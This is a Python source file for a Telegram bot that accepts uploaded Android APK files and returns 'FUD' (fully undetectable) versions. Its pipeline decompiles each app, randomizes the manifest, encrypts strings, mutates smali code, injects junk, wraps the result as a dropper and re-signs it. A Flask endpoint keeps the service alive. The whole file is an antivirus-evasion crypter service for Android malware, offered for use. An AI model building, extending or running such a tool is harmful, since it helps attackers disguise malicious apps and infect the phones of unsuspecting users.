import os
import asyncio
import uuid
import shutil
import threading
from flask import Flask
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes,
)

from setup import ensure_tools
from apktool_wrapper import decompile, recompile
from dex_mutator import mutate_smali
from encryptor import encrypt_strings
from manifest import randomize_manifest
from junk_injector import inject_junk
from dropper import wrap_as_dropper
from signer import sign_apk
from config import BOT_TOKEN, WORK_DIR

# ---------- Flask ----------
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "FUD Bot alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, debug=False)

# ---------- Pipeline ----------
def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    decompiled_dir = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled_dir)
    randomize_manifest(decompiled_dir)
    encrypt_strings(decompiled_dir)
    mutate_smali(decompiled_dir)
    inject_junk(decompiled_dir)
    unsigned_apk = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled_dir, unsigned_apk)
    dropped_apk = os.path.join(session_dir, "dropped.apk")
    wrap_as_dropper(unsigned_apk, dropped_apk, session_dir)
    sign_apk(dropped_apk, output_apk)
    return output_apk

# ---------- Handlers ----------
async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *FUD APK Processor Bot*\n\nAPK file bhejo — FUD version milega.",
        parse_mode="Markdown",
    )

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    doc = msg.document if msg else None

    if not doc or not doc.file_name.endswith(".apk"):
        await msg.reply_text("❌ Sirf .apk file bhejo.")
        return

    session_id = str(uuid.uuid4())[:8]
    session_dir = os.path.join(WORK_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)
    input_path  = os.path.join(session_dir, "input.apk")
    output_path = os.path.join(session_dir, "fud_output.apk")

    await msg.reply_text("⚙️ Processing shuru... thoda wait karo.")

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        await tg_file.download_to_drive(input_path)
        result_path = await asyncio.to_thread(
            full_fud_pipeline, input_path, output_path, session_dir
        )
        with open(result_path, "rb") as f:
            await msg.reply_document(document=f, filename="fud_ready.apk")
        await msg.reply_text("✅ FUD APK ready!")
    except Exception as e:
        await msg.reply_text(f"❌ Error:\n`{e}`", parse_mode="Markdown")
    finally:
        shutil.rmtree(session_dir, ignore_errors=True)

# ---------- Bot ----------
async def run_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", handle_start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    await app.initialize()
    await app.start()
    await app.updater.start_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
    )
    print("🤖 Bot polling active.")
    await asyncio.Event().wait()

# ---------- Main ----------
def main():
    os.makedirs(WORK_DIR, exist_ok=True)
    print("[*] Tools setup...")
    ensure_tools()
    threading.Thread(target=run_flask, daemon=True).start()
    print("[✓] Flask started.")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        print("🛑 Stopped.")
    finally:
        loop.close()

if __name__ == "__main__":
    main()
